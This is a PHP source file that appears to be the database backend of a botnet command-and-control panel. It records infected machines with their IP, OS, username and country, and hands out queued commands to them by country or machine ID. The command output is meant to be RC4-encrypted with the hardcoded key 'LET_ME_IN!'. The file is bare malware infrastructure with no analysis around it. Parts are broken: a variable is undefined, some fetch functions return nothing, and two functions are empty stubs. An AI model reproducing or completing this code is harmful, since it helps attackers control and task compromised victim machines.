<?php
require_once('const.php');

function db($message = true)
{
  global $CONF_DB_HOST, $CONF_DB_NAME, $CONF_DB_USER, $CONF_DB_PASS;
  try
  {
     return new PDO('mysql:host='.$CONF_DB_HOST.';dbname='.$CONF_DB_NAME.';charset=utf8', $CONF_DB_USER, $CONF_DB_PASS, 
        array(PDO::MYSQL_ATTR_INIT_COMMAND => 'SET NAMES "utf8"'));
  }
  catch(PDOException $e)
  {
     if($message)
        echo 'Can\'t connect to the database. Change <a href="settings.php">settings</a>?';
     exit();
  }
}

function db_add_bot($db, $guid, $ip, $os, $arch, $username)
{
   $sql  = "INSERT INTO bots (guid, ip, os, arch, country, username, last_seen, first_seen, last_command) VALUES (?, ?, ?, ?, ?, ?, ?, ?, 0)";
   $stmt = $db->prepare($sql);

   $stmt->bindValue(1, $guid,            PDO::PARAM_STR);
   $stmt->bindValue(2, $ip,              PDO::PARAM_INT);
   $stmt->bindValue(3, $os,              PDO::PARAM_INT);
   $stmt->bindValue(4, $arch,            PDO::PARAM_INT);
   $stmt->bindValue(5, get_country($ip), PDO::PARAM_STR);
   $stmt->bindValue(6, $username,        PDO::PARAM_STR);
   $stmt->bindValue(7, time(),           PDO::PARAM_INT);
   $stmt->bindValue(8, time(),           PDO::PARAM_INT);

   $status = $stmt->execute();
}

function db_delete_bot($db, $guid)
{
   $sql  = "DELETE FROM bots WHERE guid=?";
   $stmt = $db->prepare($sql);
   $stmt->bindValue(1, $guid, PDO::PARAM_STR);
   $status = $stmt->execute();
   return $status;
}

function db_update_bot($db, $guid, $ip, $country, $last_command)
{
   $sql  = "UPDATE bots SET last_seen = ?, ip = ?, country = ?, last_command = ? WHERE guid=?";
   $stmt = $db->prepare($sql);

   $stmt->bindValue(1, time(),        PDO::PARAM_INT);
   $stmt->bindValue(2, $ip,           PDO::PARAM_INT);
   $stmt->bindValue(3, $country,      PDO::PARAM_STR);
   $stmt->bindValue(4, $last_command, PDO::PARAM_INT);
   $stmt->bindValue(5, $guid,         PDO::PARAM_STR);

   $status = $stmt->execute();
}

function db_fetch_bot($db, $guid)
{
   $sql    = "SELECT guid FROM bots WHERE guid = ?";
   $stmt   = $db->prepare($sql);
   $stmt->bindValue(1, $guid, PDO::PARAM_STR);
   $status = $stmt->execute();
}

function db_fetch_bot_last_command($db, $guid, $last_command)
{
   $sql     = "SELECT last_command FROM bots WHERE guid = ?";
   $stmt    = $db->prepare($sql);

   $stmt->bindValue(1, $guid, PDO::PARAM_STR);

   $status  = $stmt->execute();
   if ($stmt->rowCount() === 0)
   {
      echo '0';
      exit();
   }

   $last_command = $stmt->fetchColumn();
}

function db_add_task()
{

}

function db_delete_task()
{

}

function db_fetch_tasks($db, $guid, $last_command)
{
   $sql  = "SELECT * FROM commands WHERE (execs < `limit` OR `limit` = 0) AND enabled = 1 AND (id > ? OR ? = 0)";
   $stmt = $db->prepare($sql);

   $stmt->bindValue(1, $last_command, PDO::PARAM_INT);
   $stmt->bindValue(2, $last_command, PDO::PARAM_INT);

   $stmt->execute();

   $rows   = $stmt->fetchAll();
   $output = '';

   foreach ($rows as $row)
   {
      if ($row['countries'] != '')
      {
         $countries = explode(' ', $row['countries']);
         if (!in_array($country, $countries))
            continue;
      }

      if ($row['guids'] != '')
      {
         $guids = explode(' ', $row['guids']);
         if (!in_array($guid, $guids))
            continue;
      }

      $sql = "UPDATE commands SET execs = execs + 1 WHERE id = ?";
      $stmt = $db->prepare($sql);
      $stmt->bindValue(1, $row['id'], PDO::PARAM_INT);
      $stmt->execute();
      $last_command = $row['id'];
      $output .= 'COMMAND'.'|'.$row['type'].'|'.$row['param']."\r\n";
   }

   $crypt = RC4($output, "LET_ME_IN!");
   echo $output;
}
?>